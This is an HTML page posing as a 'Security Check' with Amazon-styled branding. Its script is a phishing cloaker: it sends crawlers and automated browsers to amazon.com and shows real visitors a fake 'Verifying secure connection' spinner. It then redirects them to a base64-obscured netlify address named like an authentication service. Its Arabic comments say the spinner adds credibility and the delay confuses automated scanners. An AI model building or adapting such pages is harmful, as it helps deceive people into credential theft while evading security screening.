<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Security Check...</title>
    <script>
        (function() {
            // 1. فحص صارم للبوتات (Anti-Bot Phase)
            const isBot = () => {
                const n = navigator;
                return n.webdriver || !n.languages || n.languages.length === 0 || /bot|google|baidu|lighthouse/i.test(n.userAgent);
            };

            if (isBot()) {
                window.location.replace("https://www.amazon.com/security-updates"); 
                return;
            }

            // 2. الرابط المشفر (Netlify Link)
            const _secretData = "aHR0cHM6Ly91c2VyLXNlcnZpY2UtYXV0aGVudGljYXRpb24ubmV0bGlmeS5hcHAv";

            try {
                // فك التشفير وبناء الـ Blob
                const targetUrl = atob(_secretData);
                
                // عرض رسالة تحميل وهمية لزيادة المصداقية
                document.body.innerHTML = `
                    <div style="font-family:Arial; text-align:center; margin-top:20%; color:#232f3e;">
                        <div style="border:4px solid #f3f3f3; border-top:4px solid #ff9900; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:auto;"></div>
                        <p style="margin-top:20px; font-weight:bold;">Verifying secure connection...</p>
                        <p style="font-size:12px; color:#888;">Please do not close this window.</p>
                    </div>
                    <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
                `;

                // 3. التحويل النهائي بعد ثانيتين (التوقيت يشتت أنظمة الفحص التلقائي)
                setTimeout(() => {
                    window.location.href = targetUrl;
                }, 2500);

            } catch(e) {
                window.location.replace("https://www.amazon.com");
            }
        })();
    </script>
</head>
<body></body>
</html>
